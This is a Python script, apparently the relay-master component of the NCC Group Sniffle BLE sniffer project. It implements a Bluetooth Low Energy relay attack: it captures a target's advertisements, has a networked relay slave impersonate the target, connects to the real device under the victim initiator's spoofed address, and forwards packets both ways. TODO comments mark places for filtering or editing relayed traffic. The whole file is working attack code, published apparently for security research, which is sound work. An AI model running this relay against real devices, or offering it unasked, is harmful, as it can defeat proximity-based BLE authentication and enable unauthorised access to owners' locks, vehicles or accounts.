#!/usr/bin/env python3

# Written by Sultan Qasim Khan
# Copyright (c) 2020, NCC Group plc
# Released as open source under GPLv3

import argparse, sys
from binascii import unhexlify
from threading import Thread

from pcap import PcapBleWriter
from sniffle_hw import SniffleHW, BLE_ADV_AA, PacketMessage, DebugMessage, StateMessage, SnifferState
from packet_decoder import DPacketMessage, DataMessage, LlDataContMessage, AdvIndMessage, \
        AdvDirectIndMessage, ScanRspMessage, ConnectIndMessage, str_mac
from relay_protocol import RelayServer, MessageType

"""
Relay attack principles:

A and S refer to the real advertiser/peripheral/slave
I_r and M_r refer to relay_master.py
A_r and S_r refer to relay_slave.py
I and M refer to the real initiator/central/master

Relay master script also has a network listener, relay slave connects to it.

First, the relay master (I_r) gathers the adverisement body and scan response
from the victim advertiser (A). Next, the advertisement data is passed onto
the relay slave (A_r) to mimic the victim advertiser. Once the victim
initiator (I) connects to the relay slave (A_r) mimicking the victim advertiser,
the relay slave will inform the relay master, so that it can start its own
connection to the real victim advertiser with potentially different parameters.

I               A_r             I_r             A
                                <----------Advert
                                ScanReq--------->
                                <---------ScanRsp
                <---------Advert
                <--------ScanRsp
<---------Advert
ScanReq-------->
<--------ScanRsp
ConnReq-------->
(I starts channel hopping with A_r)
                ConnReq-------->
                                (wait for next advert)
                                <----------Advert
                                ConnReq--------->

Once connected, data can be encrypted, but we don't care, we just pass it on.
One limitation is that encrypted LL_CONTROL messages could change hopping
parameters, but we can't decipher them. It may be possible to make an educated
guess of what the control messages are though based on past behaviour.

M               S_r             M_r             S
Encrypted------>
<----------Empty
                Encrypted----->
                                Encrypted------>
                                <--------EncResp
                <--------EncResp
(wait for next conn event)
Empty--------->
<-------EncResp
"""

# global variable to access hardware
hw = None
_aa = 0

def main():
    aparse = argparse.ArgumentParser(description="Relay master script for Sniffle BLE5 sniffer")
    aparse.add_argument("-s", "--serport", default="/dev/ttyACM0", help="Sniffer serial port name")
    aparse.add_argument("-c", "--advchan", default=37, choices=[37, 38, 39], type=int,
            help="Advertising channel to listen on")
    aparse.add_argument("-m", "--mac", default=None, help="Specify target MAC address")
    aparse.add_argument("-i", "--irk", default=None, help="Specify target IRK")
    aparse.add_argument("-P", "--public", action="store_const", default=False, const=True,
            help="Supplied MAC address is public")
    aparse.add_argument("-q", "--quiet", action="store_const", default=False, const=True,
            help="Don't show empty packets")
    args = aparse.parse_args()

    global hw
    hw = SniffleHW(args.serport)

    if args.mac is None and args.irk is None:
        print("Must specify target MAC address or IRK", file=sys.stderr)
        return
    if args.mac and args.irk:
        print("IRK and MAC filters are mutually exclusive!", file=sys.stderr)
        return
    if args.public and args.irk:
        print("IRK only works on RPAs, not public addresses!", file=sys.stderr)
        return

    # wait for relay slave to connect to us
    server = RelayServer()
    print("Waiting for relay slave to connect...")
    conn = server.accept()
    print("Got connection from", conn.peer_ip)

    if args.irk:
        macBytes = get_mac_from_irk(unhexlify(args.irk), args.advchan)
    else:
        try:
            macBytes = [int(h, 16) for h in reversed(args.mac.split(":"))]
            if len(macBytes) != 6:
                raise Exception("Wrong length!")
        except:
            print("MAC must be 6 colon-separated hex bytes", file=sys.stderr)
            return

    # obtain the target's advertisement and scan response, share it with relay slave
    adv, scan_rsp = scan_target(macBytes)
    conn.send_msg(MessageType.ADVERT, adv)
    conn.send_msg(MessageType.SCAN_RSP, scan_rsp)

    # relay slave will now impersonate our target

    # wait for relay slave to say who connected to it
    print("Waiting for relay slave to notify us of connection...")
    mtype, body = conn.recv_msg()
    if mtype != MessageType.CONN_REQ:
        raise ValueError("Unexpected message type %s" % mtype.name)
    conn_req = DPacketMessage.from_body(body)
    if not isinstance(conn_req, ConnectIndMessage):
        raise ValueError("CONN_REQ was not a CONN_REQ!")
    connector_addr = conn_req.InitA
    connector_random = bool(conn_req.TxAdd)
    connector_interval = conn_req.Interval
    connector_latency = conn_req.Latency
    print("Relay slave notified us of connection request. Connecting to real target.")

    # connect to real target, impersonating who connected to relay slave
    connect_target(macBytes, args.advchan, not args.public, connector_addr,
            connector_random, connector_interval, connector_latency)

    # spawn another thread to receive and forward packets from relay slave
    # it's safe to call hardware commands from a separate thread since
    # recv_and_decode in this main thread only reads, not writes
    slave_thread = Thread(target=network_thread_loop, args=(conn,), daemon=True)
    slave_thread.start()

    while True:
        msg = hw.recv_and_decode()
        print_message(msg, args.quiet)

        # only forward packets
        if not isinstance(msg, PacketMessage):
            continue
        msg = DPacketMessage.decode(msg)

        # ignore straggling advertisements
        if not isinstance(msg, DataMessage):
            continue

        # ignore empty packets
        if isinstance(msg, LlDataContMessage) and msg.data_length == 0:
            continue

        # TODO: filter/edit messages as needed

        # Forward packets to the relay slave
        conn.send_msg(MessageType.PACKET, msg.body)

def network_thread_loop(conn):
    # receive packets from relay slave and retransmit them here
    while True:
        mtype, body = conn.recv_msg()
        if mtype != MessageType.PACKET:
            continue
        llid = body[0] & 3
        pdu = body[2:]

        # TODO: filter/edit messages as needed

        hw.cmd_transmit(llid, pdu)

# assumes sniffer is already configured to receive ads with IRK filter
def get_mac_from_irk(irk, chan=37):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False) # capture advertisements only
    hw.cmd_rssi(-128)
    hw.cmd_irk(irk, False)
    hw.cmd_auxadv(False)
    hw.mark_and_flush()

    print("Waiting for advertisement with suitable RPA...")
    while True:
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, AdvIndMessage) or isinstance(dpkt, AdvDirectIndMessage):
            print("Found target MAC: %s" % str_mac(dpkt.AdvA))
            return dpkt.AdvA

# TODO: implement active scanning some day
def scan_target(mac):
    advPkt = None
    scanRspPkt = None

    hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac(mac) # hop with target for better scan detection
    hw.cmd_auxadv(False) # we only support impersonating legacy advertisers for now
    hw.mark_and_flush()

    while (advPkt is None) or (scanRspPkt is None):
        msg = hw.recv_and_decode()
        if not isinstance(msg, PacketMessage):
            continue
        dpkt = DPacketMessage.decode(msg)
        if isinstance(dpkt, AdvIndMessage) or isinstance(dpkt, AdvDirectIndMessage):
            if advPkt is None:
                print("Found advertisement.")
            advPkt = dpkt
        elif isinstance(dpkt, ScanRspMessage):
            if scanRspPkt is None:
                print("Found scan response.")
            scanRspPkt = dpkt

    print("Target Advertisement:")
    print(advPkt)
    print()
    print("Target Scan Response:")
    print(scanRspPkt)
    print()

    return advPkt.body, scanRspPkt.body

def connect_target(targ_mac, chan=37, targ_random=True, initiator_mac=None, initiator_random=True,
        interval=24, latency=1):
    hw.cmd_chan_aa_phy(chan, BLE_ADV_AA, 0)
    hw.cmd_pause_done(True)
    hw.cmd_follow(False)
    hw.cmd_rssi(-128)
    hw.cmd_mac(targ_mac, False)
    hw.cmd_auxadv(False)
    if initiator_mac is None:
        hw.random_addr()
    else:
        hw.cmd_setaddr(initiator_mac, initiator_random)
    hw.mark_and_flush()

    # now enter initiator mode
    global _aa
    _aa = hw.initiate_conn(targ_mac, targ_random, interval, latency)

def print_message(msg, quiet=False):
    if isinstance(msg, PacketMessage):
        print_packet(msg, quiet)
    elif isinstance(msg, DebugMessage):
        print(msg, end='\n\n')
    elif isinstance(msg, StateMessage):
        print(msg, end='\n\n')
        if msg.new_state == SnifferState.MASTER:
            hw.decoder_state.cur_aa = _aa

def print_packet(pkt, quiet=False):
    # Further decode and print the packet
    dpkt = DPacketMessage.decode(pkt)
    if quiet and isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0:
        return
    print(dpkt, end='\n\n')

if __name__ == "__main__":
    main()
